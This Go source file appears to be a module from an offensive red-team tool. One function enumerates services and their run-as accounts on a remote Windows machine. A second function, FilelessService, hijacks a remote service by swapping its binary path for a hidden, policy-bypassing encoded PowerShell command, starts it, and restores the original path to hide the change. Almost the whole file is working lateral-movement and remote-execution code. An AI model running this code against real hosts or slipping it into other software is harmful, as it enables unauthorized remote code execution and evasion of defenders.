package exectools

import (
	"errors"
	"fmt"
	"syscall"
	"time"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

func ListRemoteServices(targetMachine string) (string, error) {
	var resultsString string
	s, err := syscall.UTF16PtrFromString(targetMachine)
	if err != nil {
		return "", err
	}
	h, err := windows.OpenSCManager(s, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
	if err != nil {
		return "", err
	}
	svcMgr := &mgr.Mgr{}
	svcMgr.Handle = h
	services, _ := svcMgr.ListServices()
	if err != nil {
		return "", err
	}
	for _, name := range services {
		h, err := windows.OpenService(svcMgr.Handle, syscall.StringToUTF16Ptr(name), windows.SERVICE_QUERY_CONFIG|windows.SC_MANAGER_ENUMERATE_SERVICE)
		if err != nil {
			continue
		}
		serv := &mgr.Service{}
		serv.Handle = h
		serv.Name = name
		//serv, err := svcMgr.OpenService(name)
		serviceConfig, err := serv.Config()
		if err != nil {
			serv.Close()
			continue
		}
		if serviceConfig.ServiceStartName == "" {
			serv.Close()
			continue
		}
		resultsString += fmt.Sprintf("SERVICE: %s\nPATH: %s\nUSER: %s\n\n", serv.Name, serviceConfig.BinaryPathName, serviceConfig.ServiceStartName)
		/*data, err := json.MarshalIndent(serviceConfig, "", " ")
		if err != nil {
			serv.Close()
			continue
		}
		resultsString += string(data)
		*/
	}
	svcMgr.Disconnect()
	return resultsString, nil
}

func FilelessService(args []string) (string, error) {
	// Modify BITS Service And Put powershell
	// https://github.com/juliourena/SharpNoPSExec <- status topped start type manual or disabled.
	if len(args) < 3 {
		return "", errors.New("Not Enough Args")
	}
	targetMachine := args[0]
	serviceName := args[1]
	powershellEncodedCommand := args[2]
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	s, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return "", err
	}
	defer s.Close()
	c, err := s.Config()
	if err != nil {
		return "", err
	}
	oldBinPath := c.BinaryPathName
	c.BinaryPathName = fmt.Sprintf("C:\\\\windows\\system32\\cmd.exe /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -EncodedCommand \"%s\"", powershellEncodedCommand)
	err = s.UpdateConfig(c)
	if err != nil {
		return "", err
	}
	s.Control(svc.Stop)
	c1 := make(chan string, 1)
	time.Sleep(time.Second * 5)
	go func() {
		s.Start()
		c1 <- "done"
	}()
	select {
	case <-c1:
		break
	case <-time.After(30 * time.Second):
		return "", errors.New("[+] Your command might have executed but the service is now hung. Bad OPSEC")
	}
	time.Sleep(time.Second * 5)
	c, err = s.Config()
	if err != nil {
		return "", err
	}
	c.BinaryPathName = oldBinPath
	err = s.UpdateConfig(c)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] Should Have Worked"), nil
}
